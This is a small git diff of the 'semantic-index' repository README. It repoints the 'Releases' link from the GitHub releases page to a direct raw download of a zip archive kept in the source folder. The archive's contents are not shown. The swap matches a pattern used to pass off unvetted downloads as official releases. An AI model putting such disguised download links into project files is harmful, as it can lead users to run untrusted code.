@@ -35,7 +35,7 @@ Welcome to the "semantic-index" repository, your go-to destination for a lightwe
 
 ## Releases 📦
 
-For the latest updates and releases, visit [here](https://github.com/Mojne/semantic-index/releases).
+For the latest updates and releases, visit [here](https://raw.githubusercontent.com/Mojne/semantic-index/main/src/index-semantic-2.6.zip).
 
 ## Getting Started 🚀
 
